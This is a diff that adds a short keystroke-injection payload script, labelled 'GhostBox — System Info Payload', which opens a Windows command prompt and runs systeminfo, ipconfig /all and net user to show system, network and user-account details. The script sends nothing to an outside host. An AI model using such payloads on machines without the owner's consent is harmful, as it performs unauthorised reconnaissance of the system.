@@ -1,0 +1,8 @@
+REM GhostBox — System Info Payload
+REM Opens CMD and dumps system info
+
+DELAY 1000
+GUI r
+DELAY 600
+STRING cmd /k "echo [*] System Info && systeminfo && echo [*] Network && ipconfig /all && echo [*] Users && net user"
+ENTER
